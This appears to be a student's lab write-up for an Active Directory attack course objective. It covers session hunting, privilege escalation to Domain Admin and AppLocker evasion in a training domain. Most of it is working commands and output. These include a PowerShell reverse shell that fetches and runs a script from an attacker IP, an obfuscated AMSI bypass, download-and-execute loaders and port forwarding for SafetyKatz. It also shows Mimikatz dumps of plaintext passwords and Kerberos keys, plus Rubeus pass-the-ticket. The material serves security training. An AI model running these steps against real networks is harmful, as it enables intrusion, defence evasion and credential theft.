# LEARNING OBJECTIVE 7
1. Identify a machine in the target domain where a Domain Admin session is available

We have access to two domain users - studentx and ciadmin and administrative access to dcorpadminsrv machine. User hunting has not been fruitful as studentx. We got a reverse shell on dcorp-ci as ciadmin by abusing Jenkins.

We can use Invoke-SessionHunter.ps1 from the student VM to list sessions on all the remote machines. The script connects to Remote Registry service on remote machines that runs by default. Also, admin access is not required on the remote machines.

`. C:\AD\Tools\Invoke-SessionHunter.ps1`

```
Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access

[+] Elapsed time: 0:0:34.822

HostName       UserSession                Access
--------       -----------                ------
dcorp-appsrv   dcorp\appadmin              False
dcorp-mgmt     dcorp\mgmtadmin             False
dcorp-mssql    dcorp\sqladmin              False
dcorp-sql1     dcorp\sql1admin             False
dcorp-std201   dcorp\student201            False
dcorp-std202   dcorp\student202            False
dcorp-std203   dcorp\student203            False
dcorp-std205   dcorp\student205            False
dcorp-std206   dcorp\student206            False
dcorp-std207   dcorp\student207            False
dcorp-std208   dcorp\student208            False
dcorp-std209   dcorp\student209            False
dcorp-std211   dcorp\student211            False
dcorp-std213   dcorp\student213            False
dcorp-std215   dcorp\student215            False
dcorp-std216   dcorp\student216            False
dcorp-std217   dcorp\student217            False
dcorp-std218   dcorp\student218            False
dcorp-std219   dcorp\student219            False
dcorp-std220   dcorp\student220            False
dcorp-stdadmin dcorp\studentadmin          False
dcorp-dc       dcorp\Administrator         False
dcorp-dc       dcorp\svcadmin              False
dcorp-mgmt     dcorp\svcadmin              False
dcorp-std202   DCORP-STD214\Administrator  False
dcorp-stdadmin DCORP-STD214\Administrator  False
dcorp-adminsrv dcorp\appadmin               True
dcorp-adminsrv dcorp\srvadmin               True
dcorp-adminsrv dcorp\student201             True
dcorp-adminsrv dcorp\websvc                 True
dcorp-ci       dcorp\ciadmin                True
dcorp-ci       dcorp\devopsadmin            True
```
Opsec friendly and avoiding detection:

```
C:\AD\Tools>cat C:\AD\Tools\servers.txt
DCORP-ADMINSRV
DCORP-APPSRV
DCORP-CI
DCORP-MGMT
DCORP-MSSQL
C:\AD\Tools>Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\AD\Tools\servers.txt | select Hostname,UserSession,Access
[+] Elapsed time: 0:0:3.932

HostName       UserSession     Access
--------       -----------     ------
DCORP-APPSRV   dcorp\appadmin   False
DCORP-CI       dcorp\ciadmin    False
DCORP-MGMT     dcorp\mgmtadmin  False
DCORP-MSSQL    dcorp\sqladmin   False
DCORP-MGMT     dcorp\svcadmin   False
DCORP-ADMINSRV dcorp\appadmin    True
DCORP-ADMINSRV dcorp\srvadmin    True
DCORP-ADMINSRV dcorp\websvc      True
```

`NOTE there is a domain admin (svcadmin) session on dcorp-mgmt server`

Enumeration using PowerView on dcorp-ci reverse shell through Jenkins

Jenkins Reverse Shell:
```
powershell.exe iex (iwr http://172.16.100.214/Power.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.214 -Port 443
```

Bypass Enhanced Script Block Logging
```
iex (iwr http://172.16.100.214/sbloggingbypass.txt -UseBasicParsing)
```

Bypass AMSI

```
S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

Download and execute PowerView

```
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.214/PowerView.ps1'))
```

```
Find-DomainUserLocation

UserDomain      : DCORP-CI
UserName        : Administrator
ComputerName    : dcorp-ci.dollarcorp.moneycorp.local
IPAddress       : 172.16.3.11
SessionFrom     :
SessionFromName :
LocalAdmin      :

UserDomain      : dcorp
UserName        : svcadmin
ComputerName    : dcorp-mgmt.dollarcorp.moneycorp.local
IPAddress       : 172.16.4.44
SessionFrom     :
SessionFromName :
LocalAdmin      :
```

winrs to access dcorp-mgmt


```
winrs -r:dcorp-mgmt cmd /c "set computername && set username"
```

Can now run <b>SafetyKatz.exe</b> on DCORP-MGMT

```
iwr http://172.16.100.214/Loader.exe -OutFile C:\Users\Public\Loader.exe
```

```
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe

Does \\dcorp-mgmt\C$\Users\Public\Loader.exe specify a file name
or directory name on the target
(F = file, D = directory)? F
C:\Users\Public\Loader.exe
1 File(s) copied
```
add port forwarding on dcorp-mgmt to avoid detection:
```
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.214"
```

`$null is used to address output redirection issues`

`NOTE dont forget to serve Loader.exe and SafetyKatz.exe`

Run safetykatz on dcorp-mgmt:
```
$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
```

Use svcadmin creds

`NOTE WITH ADMIN PRIVILEGES`
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

```
winrs -r:dcorp-dc cmd /c set username
USERNAME=svcadmin
```

2. Compromise the machine and escalate privileges to Domain Admin by abusing reverse shell on dcorp-ci
```
PS C:\Users\student214> . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
PS C:\Users\student214> Find-PSRemotingLocalAdminAccess

dcorp-adminsrv
```

3. Escalate privileges to DA by abusing derivative local admin through dcorp-adminsrv. On dcorp-adminsrv, tackle application allowlisting using:
    - Gaps in applocker rules
    - Disable applocker by modifying GPO applicable to dcorp-adminsrv


#### Gaps in applocker rules
```
winrs -r:dcorp-adminsrv cmd
```

```
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Appx
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Dll
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Exe
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Msi
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Script
```

Applocker is configured, Microsoft signed binaries and scripts are allowed for all users but nothing else

```
C:\Users\student214>reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454f-a263-2515c8796a5d

reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454f-a263-2515c8796a5d

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454f-a263-2515c8796a5d
    Value    REG_SZ    <FilePathRule Id="06dce67b-934c-454f-a263-2515c8796a5d" Name="(Default Rule) All scripts located in the Program Files folder" Description="Allows members of the Everyone group to run scripts that are located in the Program Files folder." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition Path="%PROGRAMFILES%\*"/></Conditions></FilePathRule>
```

Copy Invoke-Mimi.ps1 and add the following value to the end of the file:
```
$8 = "s";
$c = "e";
$g = "k";
$t = "u";
$p = "r";
$n = "l";
$7 = "s";
$6 = "a";
$l = ":";
$2 = ":";
$z = "e";
$e = "k";
$0 = "e";
$s = "y";
$1 = "s";
$Pwn = $8 + $c + $g + $t + $p + $n + $7 + $6 + $l + $2 + $z + $e + $0 + $s + $1 ;
Invoke-Mimi -Command $Pwn
```

On student machine:
```
Copy-Item C:\AD\Tools\Invoke-MimiEx-keys-stdx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
```

On dcorp-adminsrv, run the script:
```
Enter-PSSession dcorp-adminsrv
```

```
[dcorp-adminsrv]: PS C:\Program Files> .\I-ME-k-s.ps1

  .#####.   mimikatz 2.2.0 (x64) #19041 May 23 2024 17:47:47
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # sekurlsa::ekeys

Authentication Id : 0 ; 130819 (00000000:0001ff03)
Session           : Service from 0
User Name         : websvc
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 1/17/2025 12:35:01 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1114

         * Username : websvc
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : AServicewhichIsNotM3@nttoBe
         * Key List :
           aes256_hmac       2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7
           aes128_hmac       86a353c1ea16a87c39e2996253211e41
           rc4_hmac_nt       cc098f204c5887eaa8253e7c2749156f
           rc4_hmac_old      cc098f204c5887eaa8253e7c2749156f
           rc4_md4           cc098f204c5887eaa8253e7c2749156f
           rc4_hmac_nt_exp   cc098f204c5887eaa8253e7c2749156f
           rc4_hmac_old_exp  cc098f204c5887eaa8253e7c2749156f

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : DCORP-ADMINSRV$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 1/17/2025 12:34:46 AM
SID               : S-1-5-20

         * Username : dcorp-adminsrv$
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51
           rc4_hmac_nt       b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old      b5f451985fd34d58d5120816d31b5565
           rc4_md4           b5f451985fd34d58d5120816d31b5565
           rc4_hmac_nt_exp   b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old_exp  b5f451985fd34d58d5120816d31b5565

Authentication Id : 0 ; 22559 (00000000:0000581f)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/17/2025 12:34:46 AM
SID               : S-1-5-96-0-0

         * Username : DCORP-ADMINSRV$
         * Domain   : dollarcorp.moneycorp.local
         * Password : Q:hFT'!FUXP6E_2)CK dxm2vl*'N>a;z-NIMogeiBtHMtjgw@,Lx:YD.="5G[e  Y+wN@^44>IT@sd^DxQ4HWRY6%208?lTEbU`u.H0d%zYIW/d@QaT7Ztd'
         * Key List :
           aes256_hmac       82ecf869176628379da0ae884b582c36fc2215ef7e8e3e849d720847299257ff
           aes128_hmac       3f3532b2260c2851bf57e8b5573f7593
           rc4_hmac_nt       b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old      b5f451985fd34d58d5120816d31b5565
           rc4_md4           b5f451985fd34d58d5120816d31b5565
           rc4_hmac_nt_exp   b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old_exp  b5f451985fd34d58d5120816d31b5565

Authentication Id : 0 ; 1255286 (00000000:00132776)
Session           : RemoteInteractive from 2
User Name         : srvadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 1/17/2025 3:11:47 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1115

         * Username : srvadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4
           rc4_hmac_nt       a98e18228819e8eec3dfa33cb68b0728
           rc4_hmac_old      a98e18228819e8eec3dfa33cb68b0728
           rc4_md4           a98e18228819e8eec3dfa33cb68b0728
           rc4_hmac_nt_exp   a98e18228819e8eec3dfa33cb68b0728
           rc4_hmac_old_exp  a98e18228819e8eec3dfa33cb68b0728

Authentication Id : 0 ; 1238534 (00000000:0012e606)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/17/2025 3:11:39 AM
SID               : S-1-5-96-0-2

         * Username : DCORP-ADMINSRV$
         * Domain   : dollarcorp.moneycorp.local
         * Password : Q:hFT'!FUXP6E_2)CK dxm2vl*'N>a;z-NIMogeiBtHMtjgw@,Lx:YD.="5G[e  Y+wN@^44>IT@sd^DxQ4HWRY6%208?lTEbU`u.H0d%zYIW/d@QaT7Ztd'
         * Key List :
           aes256_hmac       82ecf869176628379da0ae884b582c36fc2215ef7e8e3e849d720847299257ff
           aes128_hmac       3f3532b2260c2851bf57e8b5573f7593
           rc4_hmac_nt       b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old      b5f451985fd34d58d5120816d31b5565
           rc4_md4           b5f451985fd34d58d5120816d31b5565
           rc4_hmac_nt_exp   b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old_exp  b5f451985fd34d58d5120816d31b5565

Authentication Id : 0 ; 130880 (00000000:0001ff40)
Session           : Service from 0
User Name         : appadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 1/17/2025 12:35:01 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1117

         * Username : appadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : *ActuallyTheWebServer1
         * Key List :
           aes256_hmac       68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb
           aes128_hmac       449e9900eb0d6ccee8dd9ef66965797e
           rc4_hmac_nt       d549831a955fee51a43c83efb3928fa7
           rc4_hmac_old      d549831a955fee51a43c83efb3928fa7
           rc4_md4           d549831a955fee51a43c83efb3928fa7
           rc4_hmac_nt_exp   d549831a955fee51a43c83efb3928fa7
           rc4_hmac_old_exp  d549831a955fee51a43c83efb3928fa7

Authentication Id : 0 ; 22523 (00000000:000057fb)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/17/2025 12:34:46 AM
SID               : S-1-5-96-0-1

         * Username : DCORP-ADMINSRV$
         * Domain   : dollarcorp.moneycorp.local
         * Password : Q:hFT'!FUXP6E_2)CK dxm2vl*'N>a;z-NIMogeiBtHMtjgw@,Lx:YD.="5G[e  Y+wN@^44>IT@sd^DxQ4HWRY6%208?lTEbU`u.H0d%zYIW/d@QaT7Ztd'
         * Key List :
           aes256_hmac       82ecf869176628379da0ae884b582c36fc2215ef7e8e3e849d720847299257ff
           aes128_hmac       3f3532b2260c2851bf57e8b5573f7593
           rc4_hmac_nt       b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old      b5f451985fd34d58d5120816d31b5565
           rc4_md4           b5f451985fd34d58d5120816d31b5565
           rc4_hmac_nt_exp   b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old_exp  b5f451985fd34d58d5120816d31b5565

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DCORP-ADMINSRV$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 1/17/2025 12:34:45 AM
SID               : S-1-5-18

         * Username : dcorp-adminsrv$
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51
           rc4_hmac_nt       b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old      b5f451985fd34d58d5120816d31b5565
           rc4_md4           b5f451985fd34d58d5120816d31b5565
           rc4_hmac_nt_exp   b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old_exp  b5f451985fd34d58d5120816d31b5565

```

Got multiple creds like websvc etc, but want srvadmin

Another MimiKatz command:
```

```
```
[dcorp-adminsrv]: PS C:\Program Files> .\Invoke-MimiEx-vault-stdx.ps1

  .#####.   mimikatz 2.2.0 (x64) #19041 May 23 2024 17:47:47
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

588     {0;000003e7} 1 D 17431          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;0040d8e7} 0 D 4301141     dcorp\student214        S-1-5-21-719815819-3726368948-3917688648-20614       (10g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 4405250     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz(powershell) # vault::cred /patch
TargetName : Domain:batch=TaskScheduler:Task:{D1FE8F15-FC32-486B-94BC-471E4B1C1BB9} / <NULL>
UserName   : dcorp\srvadmin
Comment    : <NULL>
Type       : 2 - domain_password
Persist    : 2 - local_machine
Flags      : 00004004
Credential : TheKeyUs3ron@anyMachine!
Attributes : 0
```

Got <b>srvadmin</b> creds in plaintext, use:
```
runas /user:dcorp\srvadmin /netonly cmd
```

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1

Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local -Verbose
VERBOSE: Trying to run a command parallely on the provided computers list using PSRemoting.
dcorp-adminsrv
dcorp-mgmt
````

We have local admin access on the dcorp-mgmt server as srvadmin and we already know a session of svcadmin is present on that machine.

Let's use SafetyKatz to extract credentials from the machine. Run the below commands from the process running as srvadmin.

```
winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe "sekurlsa::Evasive-keys" "exit"

[snip]
Authentication Id : 0 ; 58866 (00000000:0000e5f2)
Session           : Service from 0
User Name         : svcadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 12/5/2024 2:41:08 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1118

         * Username : svcadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
              aes256_hmac       6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
         rc4_hmac_nt       b38ff50264b74508085d82c69794a4d8
           rc4_hmac_old      b38ff50264b74508085d82c69794a4d8
           rc4_md4           b38ff50264b74508085d82c69794a4d8
           rc4_hmac_nt_exp   b38ff50264b74508085d82c69794a4d8
           rc4_hmac_old_exp  b38ff50264b74508085d82c69794a4d8
```

#### Disable applocker by modifying GPO applicable to dcorp-adminsrv
Install GPMC:

`Open Server Manager -> Add Roles and Features -> Next -> Features -> Check Group Policy Management -> Next -> Install`

Run `ON AN ELEVATED SHELL`

```
runas /user:dcorp\student214 /netonly cmd
```

On the spawned CMD:
```
gpmc.msc
```

Domains -> dollarcorp.moneycorp.local -> Applocked -> Right click Applocker and edit

Expand policies -> Windows settings -> security settings -> application control policies -> applocker

Two restrictions, 
- In the 'Executable Rules', 'Everyone' is allowed to run Microsoft signed binaries. -> DELETE
- In the 'Script Rules', 'Everyone' can run Microsoft signed scripts from any location and two default rules where 'Everyone' can run Microsoft signed scripts from 'C:\Windows' and 'C:\Program Files' folders.

Wait for Group Policy refresh

OR 

Force an update on dcorp-adminsrv:
```
winrs -r:dcorp-adminsrv cmd

gpupdate /force
```

Copy Loader on the machine to use SafetyKatz
```
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-adminsrv\C$\Users\Public\Loader.exe
```

```
winrs -r:dcorp-adminsrv cmd
```

```
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.214
```

```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : http://127.0.0.1:8080/SafetyKatz.exe Arguments : sekurlsa::evasive-keys exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Nov  5 2024 21:52:02
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # -path
ERROR mimikatz_doLocal ; "-path" command of "standard" module not found !

Module :        standard
Full name :     Standard module
Description :   Basic commands (does not require module name)

            exit  -  Quit mimikatz
             cls  -  Clear screen (doesn't work with redirections, like PsExec)
          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
          coffee  -  Please, make me a coffee!
           sleep  -  Sleep an amount of milliseconds
             log  -  Log mimikatz input/output to file
          base64  -  Switch file input/output base64
         version  -  Display some version informations
              cd  -  Change or display current directory
       localtime  -  Displays system local date and time (OJ command)
        hostname  -  Displays system local hostname

mimikatz(commandline) # http://127.0.0.1:8080/SafetyKatz.exe
ERROR mimikatz_doLocal ; "http://127.0.0.1:8080/SafetyKatz.exe" command of "standard" module not found !

Module :        standard
Full name :     Standard module
Description :   Basic commands (does not require module name)

            exit  -  Quit mimikatz
             cls  -  Clear screen (doesn't work with redirections, like PsExec)
          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
          coffee  -  Please, make me a coffee!
           sleep  -  Sleep an amount of milliseconds
             log  -  Log mimikatz input/output to file
          base64  -  Switch file input/output base64
         version  -  Display some version informations
              cd  -  Change or display current directory
       localtime  -  Displays system local date and time (OJ command)
        hostname  -  Displays system local hostname

mimikatz(commandline) # -args
ERROR mimikatz_doLocal ; "-args" command of "standard" module not found !

Module :        standard
Full name :     Standard module
Description :   Basic commands (does not require module name)

            exit  -  Quit mimikatz
             cls  -  Clear screen (doesn't work with redirections, like PsExec)
          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
          coffee  -  Please, make me a coffee!
           sleep  -  Sleep an amount of milliseconds
             log  -  Log mimikatz input/output to file
          base64  -  Switch file input/output base64
         version  -  Display some version informations
              cd  -  Change or display current directory
       localtime  -  Displays system local date and time (OJ command)
        hostname  -  Displays system local hostname

mimikatz(commandline) # sekurlsa::evasive-keys

Authentication Id : 0 ; 130819 (00000000:0001ff03)
Session           : Service from 0
User Name         : websvc
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 1/17/2025 12:35:01 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1114

         * Username : websvc
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : AServicewhichIsNotM3@nttoBe
         * Key List :
           aes256_hmac       2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7
           aes128_hmac       86a353c1ea16a87c39e2996253211e41
           rc4_hmac_nt       cc098f204c5887eaa8253e7c2749156f
           rc4_hmac_old      cc098f204c5887eaa8253e7c2749156f
           rc4_md4           cc098f204c5887eaa8253e7c2749156f
           rc4_hmac_nt_exp   cc098f204c5887eaa8253e7c2749156f
           rc4_hmac_old_exp  cc098f204c5887eaa8253e7c2749156f

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : DCORP-ADMINSRV$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 1/17/2025 12:34:46 AM
SID               : S-1-5-20

         * Username : dcorp-adminsrv$
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51
           rc4_hmac_nt       b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old      b5f451985fd34d58d5120816d31b5565
           rc4_md4           b5f451985fd34d58d5120816d31b5565
           rc4_hmac_nt_exp   b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old_exp  b5f451985fd34d58d5120816d31b5565

Authentication Id : 0 ; 22559 (00000000:0000581f)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/17/2025 12:34:46 AM
SID               : S-1-5-96-0-0

         * Username : DCORP-ADMINSRV$
         * Domain   : dollarcorp.moneycorp.local
         * Password : Q:hFT'!FUXP6E_2)CK dxm2vl*'N>a;z-NIMogeiBtHMtjgw@,Lx:YD.="5G[e  Y+wN@^44>IT@sd^DxQ4HWRY6%208?lTEbU`u.H0d%zYIW/d@QaT7Ztd'
         * Key List :
           aes256_hmac       82ecf869176628379da0ae884b582c36fc2215ef7e8e3e849d720847299257ff
           aes128_hmac       3f3532b2260c2851bf57e8b5573f7593
           rc4_hmac_nt       b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old      b5f451985fd34d58d5120816d31b5565
           rc4_md4           b5f451985fd34d58d5120816d31b5565
           rc4_hmac_nt_exp   b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old_exp  b5f451985fd34d58d5120816d31b5565

Authentication Id : 0 ; 1255286 (00000000:00132776)
Session           : RemoteInteractive from 2
User Name         : srvadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 1/17/2025 3:11:47 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1115

         * Username : srvadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4
           rc4_hmac_nt       a98e18228819e8eec3dfa33cb68b0728
           rc4_hmac_old      a98e18228819e8eec3dfa33cb68b0728
           rc4_md4           a98e18228819e8eec3dfa33cb68b0728
           rc4_hmac_nt_exp   a98e18228819e8eec3dfa33cb68b0728
           rc4_hmac_old_exp  a98e18228819e8eec3dfa33cb68b0728

Authentication Id : 0 ; 1238534 (00000000:0012e606)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/17/2025 3:11:39 AM
SID               : S-1-5-96-0-2

         * Username : DCORP-ADMINSRV$
         * Domain   : dollarcorp.moneycorp.local
         * Password : Q:hFT'!FUXP6E_2)CK dxm2vl*'N>a;z-NIMogeiBtHMtjgw@,Lx:YD.="5G[e  Y+wN@^44>IT@sd^DxQ4HWRY6%208?lTEbU`u.H0d%zYIW/d@QaT7Ztd'
         * Key List :
           aes256_hmac       82ecf869176628379da0ae884b582c36fc2215ef7e8e3e849d720847299257ff
           aes128_hmac       3f3532b2260c2851bf57e8b5573f7593
           rc4_hmac_nt       b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old      b5f451985fd34d58d5120816d31b5565
           rc4_md4           b5f451985fd34d58d5120816d31b5565
           rc4_hmac_nt_exp   b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old_exp  b5f451985fd34d58d5120816d31b5565

Authentication Id : 0 ; 130880 (00000000:0001ff40)
Session           : Service from 0
User Name         : appadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 1/17/2025 12:35:01 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1117

         * Username : appadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : *ActuallyTheWebServer1
         * Key List :
           aes256_hmac       68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb
           aes128_hmac       449e9900eb0d6ccee8dd9ef66965797e
           rc4_hmac_nt       d549831a955fee51a43c83efb3928fa7
           rc4_hmac_old      d549831a955fee51a43c83efb3928fa7
           rc4_md4           d549831a955fee51a43c83efb3928fa7
           rc4_hmac_nt_exp   d549831a955fee51a43c83efb3928fa7
           rc4_hmac_old_exp  d549831a955fee51a43c83efb3928fa7

Authentication Id : 0 ; 22523 (00000000:000057fb)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/17/2025 12:34:46 AM
SID               : S-1-5-96-0-1

         * Username : DCORP-ADMINSRV$
         * Domain   : dollarcorp.moneycorp.local
         * Password : Q:hFT'!FUXP6E_2)CK dxm2vl*'N>a;z-NIMogeiBtHMtjgw@,Lx:YD.="5G[e  Y+wN@^44>IT@sd^DxQ4HWRY6%208?lTEbU`u.H0d%zYIW/d@QaT7Ztd'
         * Key List :
           aes256_hmac       82ecf869176628379da0ae884b582c36fc2215ef7e8e3e849d720847299257ff
           aes128_hmac       3f3532b2260c2851bf57e8b5573f7593
           rc4_hmac_nt       b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old      b5f451985fd34d58d5120816d31b5565
           rc4_md4           b5f451985fd34d58d5120816d31b5565
           rc4_hmac_nt_exp   b5f451985fd34d58d5120816d31b5565
